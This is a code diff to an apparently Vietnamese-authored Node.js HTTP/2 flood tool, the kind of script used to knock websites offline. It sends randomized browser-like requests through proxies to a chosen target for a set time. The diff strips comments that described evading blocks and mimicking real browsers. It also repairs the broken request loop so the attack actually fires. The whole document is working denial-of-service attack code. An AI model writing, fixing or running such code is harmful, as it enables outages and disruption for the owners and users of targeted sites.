@@ -59,7 +59,6 @@ if (!parsedTarget.protocol || !parsedTarget.host) {
     process.exit(1);
 }
 
-// Cập nhật user-agent với các trình duyệt mới nhất
 const userAgents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
@@ -108,7 +107,6 @@ const sec_ch_ua_full_version = [
     '"129.0.2792.79"'
 ];
 
-// Cập nhật ciphers để phù hợp với trình duyệt hiện đại
 const ciphers = [
     "TLS_AES_128_GCM_SHA256",
     "TLS_AES_256_GCM_SHA384",
@@ -180,12 +178,12 @@ function generateDynamicPath() {
         `token=${randstr(10)}`,
         `lang=${randomElement(['en', 'vi', 'zh', 'fr'])}`
     ];
-    const queryCount = randomIntn(1, 3); // Thêm 1-2 query để trông tự nhiên
+    const queryCount = randomIntn(1, 3);
     return `${basePath}?${queries.slice(0, queryCount).join('&')}`;
 }
 
 function generateDynamicHeaders() {
-    const uaIndex = randomIntn(0, userAgents.length); // Đảm bảo user-agent và sec-ch-ua đồng bộ
+    const uaIndex = randomIntn(0, userAgents.length);
     return {
         ":method": "GET",
         ":authority": parsedTarget.host,
@@ -219,7 +217,7 @@ function runFlooder() {
         host: parsedProxy[0],
         port: parseInt(parsedProxy[1]),
         address: parsedTarget.host + ":443",
-        timeout: 10 // Tăng timeout để xử lý proxy chậm
+        timeout: 10
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
@@ -230,14 +228,14 @@ function runFlooder() {
 
         const tlsOptions = {
             secure: true,
-            ALPNProtocols: ['h2', 'http/1.1'], // Thêm http/1.1 làm fallback
+            ALPNProtocols: ['h2', 'http/1.1'],
             ciphers: ciphers,
             host: parsedTarget.host,
             servername: parsedTarget.host,
             rejectUnauthorized: false,
             minVersion: 'TLSv1.2',
             maxVersion: 'TLSv1.3',
-            ecdhCurve: 'auto' // Tự động chọn curve để giống trình duyệt
+            ecdhCurve: 'auto'
         };
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
@@ -247,7 +245,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 20, // Giảm số luồng đồng thời để giống trình duyệt
+                maxConcurrentStreams: 20,
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536
             },
@@ -257,18 +255,19 @@ function runFlooder() {
         client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 const dynHeaders = generateDynamicHeaders();
-                for (let i = 0; i < Math.min(args.Rate, 10); // Giới hạn rate để tránh bị chặn
-                const request = client.request(dynHeaders);
-                request.on("response", () => {
-                    request.close();
-                    request.destroy();
-                });
-                request.on("error", () => {
-                    request.close();
-                    request.destroy();
-                });
-                request.end();
-            }, 200); // Giãn cách request để giống hành vi người dùng
+                for (let i = 0; i < Math.min(args.Rate, 10); i++) {
+                    const request = client.request(dynHeaders);
+                    request.on("response", () => {
+                        request.close();
+                        request.destroy();
+                    });
+                    request.on("error", () => {
+                        request.close();
+                        request.destroy();
+                    });
+                    request.end();
+                }
+            }, 200);
             setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
         });
 
